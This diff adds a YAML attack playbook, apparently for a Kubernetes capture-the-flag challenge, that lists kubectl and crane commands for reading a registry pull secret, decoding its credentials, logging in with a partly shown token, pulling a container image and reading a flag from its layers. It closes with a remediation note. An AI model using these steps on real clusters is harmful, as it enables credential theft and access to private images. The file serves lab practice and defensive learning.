@@ -1,0 +1,91 @@
+attack:
+  name: "Registry Hunt - Misconfigured ImagePullSecret Disclosure"
+  description: "Exploits exposed registry credentials to pull and inspect container image for secrets."
+
+  variables:
+    - name: challenge_namespace
+      value: "challenge2"
+    - name: pod_name
+      value: "database-pod-2c9b3a4e"
+    - name: image_name
+      value: "eksclustergames/base_ext_image"
+    - name: image_tag
+      value: "latest"
+
+  steps:
+    - id: 1.0
+      name: "Find pods in challenge namespace"
+      command: "kubectl get pod -n ${challenge_namespace}"
+      tags: ["eks", "recon"]
+      on_success:
+        - next: 1.1
+
+    - id: 1.1
+      name: "Describe pod to find image name"
+      command: "kubectl describe pod ${pod_name} -n ${challenge_namespace}"
+      tags: ["image", "registry"]
+      on_success:
+        - next: 2.0
+
+    - id: 2.0
+      name: "Read registry secret with docker config"
+      command: "kubectl get secret registry-pull-secrets-780bab1d -n ${challenge_namespace} -o yaml"
+      tags: ["secret", "dockerconfigjson"]
+      on_success:
+        - next: 2.1
+
+    - id: 2.1
+      name: "Decode .dockerconfigjson base64 blob"
+      command: "echo '<base64_data>' | base64 -d"
+      on_success:
+        - next: 2.2
+
+    - id: 2.2
+      name: "Extract and decode registry password"
+      command: "echo '<base64_auth_field>' | base64 -d"
+      on_success:
+        - next: 3.0
+
+    - id: 3.0
+      name: "Login to registry using crane"
+      command: "crane auth login -u eksclustergames -p dckr_pat_YtncV..."
+      tags: ["crane", "auth"]
+      on_success:
+        - next: 3.1
+
+    - id: 3.1
+      name: "List image tags in registry"
+      command: "crane ls ${image_name}"
+      on_success:
+        - next: 3.2
+
+    - id: 3.2
+      name: "Pull image tar locally"
+      command: "crane pull ${image_name}:${image_tag} ./image.tar"
+      on_success:
+        - next: 4.0
+
+    - id: 4.0
+      name: "Extract pulled image layers"
+      command: "tar -xvf image.tar"
+      on_success:
+        - next: 4.1
+
+    - id: 4.1
+      name: "Extract main layers (1)"
+      command: "tar -xzvf 3f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7.tar.gz"
+      on_success:
+        - next: 4.2
+
+    - id: 4.2
+      name: "Extract main layers (2)"
+      command: "tar -xzvf 193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gz"
+      on_success:
+        - next: 5.0
+
+    - id: 5.0
+      name: "Read flag from image layer"
+      command: "cat flag.txt"
+      on_success:
+        - capture_flag: "wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}"
+        - remediate: "Restrict access to image pull secrets using tighter RBAC and namespace isolation."
